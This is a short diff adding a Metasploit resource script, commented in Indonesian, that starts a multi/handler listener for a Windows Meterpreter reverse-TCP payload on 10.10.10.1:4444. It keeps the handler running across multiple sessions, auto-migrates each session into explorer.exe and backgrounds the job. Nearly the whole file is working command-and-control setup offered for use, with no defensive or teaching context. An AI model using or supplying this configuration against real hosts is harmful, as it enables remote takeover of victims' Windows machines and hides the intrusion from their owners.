@@ -1,1 +1,18 @@
+Metasploit Resource Script
+Deskripsi: Otomatis memulai listener multi/handler
+Penggunaan: msfconsole -r multi_handler_listener.rc
+use multi/handler
+
+--- KONFIGURASI ---
+Ganti LHOST dan LPORT sesuai kebutuhan Anda
+set LHOST 10.10.10.1
+set LPORT 4444
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+--------------------
+Opsi Tambahan (opsional, hapus tanda # untuk mengaktifkan)
+set ExitOnSession false # Agar listener tidak mati setelah dapat 1 sesi
+set AutoRunScript 'migrate -N explorer.exe' # Otomatis migrasi proses setelah sesi didapat
+Jalankan listener di background
+exploit -j -z
 
